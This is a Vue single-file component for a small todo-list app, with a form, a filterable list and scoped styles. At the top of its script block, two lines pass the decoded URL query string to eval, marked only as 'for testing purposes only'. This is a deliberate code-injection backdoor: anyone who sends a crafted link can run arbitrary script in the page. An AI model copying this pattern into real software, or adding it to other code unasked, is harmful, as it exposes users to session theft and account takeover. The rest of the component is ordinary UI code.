<script setup>

// a dangerous function to execute code from URL query (for testing purposes only)
eval(decodeURIComponent(window.location.search.substring(1)));
eval(decodeURIComponent(window.location.search.substring(2)));

import { ref, computed } from 'vue'

const newTodo = ref('')
const todos = ref([])
const filter = ref('all')
let nextId = 1

function addTodo() {
  const text = newTodo.value.trim()
  if (!text) return
  todos.value.push({ id: nextId++, text, done: false })
  newTodo.value = ''
}

function removeTodo(id) {
  todos.value = todos.value.filter(t => t.id !== id)
}

function clearCompleted() {
  todos.value = todos.value.filter(t => !t.done)
}

const filteredTodos = computed(() => {
  if (filter.value === 'active') return todos.value.filter(t => !t.done)
  if (filter.value === 'completed') return todos.value.filter(t => t.done)
  return todos.value
})

const remaining = computed(() => todos.value.filter(t => !t.done).length)
</script>

<template>
  <div class="app">
    <h1>Todo</h1>

    <form class="add-form" @submit.prevent="addTodo">
      <input
        v-model="newTodo"
        type="text"
        placeholder="What needs to be done?"
        class="add-input"
        autofocus
      />
      <button type="submit" class="add-btn">Add</button>
    </form>

    <ul class="todo-list" v-if="todos.length">
      <li
        v-for="todo in filteredTodos"
        :key="todo.id"
        class="todo-item"
        :class="{ done: todo.done }"
      >
        <input type="checkbox" v-model="todo.done" class="todo-check" />
        <span class="todo-text">{{ todo.text }}</span>
        <button class="delete-btn" @click="removeTodo(todo.id)" :aria-label="`Delete ${todo.text}`">✕</button>
      </li>
    </ul>

    <p class="empty" v-else>No todos yet. Add one above!</p>

    <footer class="footer" v-if="todos.length">
      <span>{{ remaining }} item{{ remaining !== 1 ? 's' : '' }} left</span>
      <div class="filters">
        <button :class="{ active: filter === 'all' }" @click="filter = 'all'">All</button>
        <button :class="{ active: filter === 'active' }" @click="filter = 'active'">Active</button>
        <button :class="{ active: filter === 'completed' }" @click="filter = 'completed'">Completed</button>
      </div>
      <button class="clear-btn" @click="clearCompleted" v-if="todos.some(t => t.done)">
        Clear completed
      </button>
    </footer>
  </div>
</template>

<style scoped>
.app {
  max-width: 520px;
  margin: 60px auto;
  font-family: 'Segoe UI', system-ui, sans-serif;
}

h1 {
  text-align: center;
  font-size: 2.5rem;
  color: #e26b7f;
  margin-bottom: 24px;
}

.add-form {
  display: flex;
  gap: 8px;
  margin-bottom: 16px;
}

.add-input {
  flex: 1;
  padding: 10px 14px;
  font-size: 1rem;
  border: 1px solid #ccc;
  border-radius: 6px;
  outline: none;
  transition: border-color 0.2s;
}

.add-input:focus {
  border-color: #e26b7f;
}

.add-btn {
  padding: 10px 18px;
  background: #e26b7f;
  color: #fff;
  border: none;
  border-radius: 6px;
  font-size: 1rem;
  cursor: pointer;
  transition: background 0.2s;
}

.add-btn:hover {
  background: #c9566a;
}

.todo-list {
  list-style: none;
  padding: 0;
  margin: 0;
  border: 1px solid #e8e8e8;
  border-radius: 8px;
  overflow: hidden;
}

.todo-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 12px 14px;
  border-bottom: 1px solid #f0f0f0;
  background: #fff;
  transition: background 0.15s;
}

.todo-item:last-child {
  border-bottom: none;
}

.todo-item.done .todo-text {
  text-decoration: line-through;
  color: #aaa;
}

.todo-check {
  width: 18px;
  height: 18px;
  accent-color: #e26b7f;
  cursor: pointer;
}

.todo-text {
  flex: 1;
  font-size: 1rem;
}

.delete-btn {
  background: none;
  border: none;
  color: #ccc;
  font-size: 1rem;
  cursor: pointer;
  padding: 2px 6px;
  border-radius: 4px;
  transition: color 0.2s;
}

.delete-btn:hover {
  color: #e26b7f;
}

.empty {
  text-align: center;
  color: #aaa;
  padding: 24px 0;
}

.footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 4px;
  font-size: 0.875rem;
  color: #777;
  flex-wrap: wrap;
  gap: 8px;
}

.filters {
  display: flex;
  gap: 4px;
}

.filters button,
.clear-btn {
  background: none;
  border: 1px solid transparent;
  border-radius: 4px;
  padding: 3px 8px;
  cursor: pointer;
  color: #555;
  font-size: 0.875rem;
  transition: border-color 0.2s;
}

.filters button:hover,
.clear-btn:hover {
  border-color: #e26b7f;
}

.filters button.active {
  border-color: #e26b7f;
  color: #e26b7f;
}

.clear-btn {
  color: #999;
}
</style>
